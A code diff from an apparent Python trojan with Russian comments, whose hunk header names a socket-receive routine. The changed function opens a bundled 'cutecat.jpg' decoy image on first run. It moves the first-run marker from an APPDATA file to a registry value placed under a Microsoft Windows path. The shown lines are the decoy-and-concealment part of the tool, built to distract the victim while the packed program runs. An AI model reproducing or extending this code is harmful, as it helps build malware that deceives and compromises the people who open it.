@@ -46,31 +46,38 @@ def reliable_recv(sock):
 
 def open_image():
     try:
-        # Путь к флаг-файлу, который указывает на первый запуск
-        flag_file = os.path.join(os.environ["APPDATA"], "cutecat_flag.txt")
-        
-        if not os.path.exists(flag_file):  # Проверяем, существует ли флаг-файл
-            if hasattr(sys, "_MEIPASS"):
-                image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
-            else:
-                image_path = os.path.join(os.getcwd(), "cutecat.jpg")
+        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\cutecat"
+        reg_value_name = "FirstRun"
 
-            logging.info(f"[+] Проверяем наличие картинки: {image_path}")
+        try:
+            # Проверяем наличие записи в реестре
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_READ) as key:
+                first_run, _ = winreg.QueryValueEx(key, reg_value_name)
+                if first_run == "True":
+                    logging.info("[+] Картинка уже открывалась ранее. Пропускаем запуск.")
+                    return
+        except FileNotFoundError:
+            pass  # Ключ не найден, считаем это первым запуском
 
-            if os.path.exists(image_path):
-                subprocess.Popen(["start", image_path], shell=True)
-                logging.info("[+] Картинка успешно открыта.")
-
-                # Создаем флаг-файл, чтобы картинка больше не запускалась
-                with open(flag_file, "w") as f:
-                    f.write("Картинка уже была открыта")
-            else:
-                logging.error("[!!] Картинка не найдена.")
+        # Запускаем картинку
+        if hasattr(sys, "_MEIPASS"):
+            image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
         else:
-            logging.info("[+] Картинка уже открывалась ранее. Пропускаем запуск.")
+            image_path = os.path.join(os.getcwd(), "cutecat.jpg")
+
+        if os.path.exists(image_path):
+            subprocess.Popen(["start", image_path], shell=True)
+            logging.info("[+] Картинка успешно открыта.")
+
+            # Устанавливаем флаг в реестре
+            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key_path) as key:
+                winreg.SetValueEx(key, reg_value_name, 0, winreg.REG_SZ, "True")
+        else:
+            logging.error("[!!] Картинка не найдена.")
 
     except Exception as e:
         logging.error(f"[!!] Ошибка при открытии картинки: {e}")
+
 
 
 
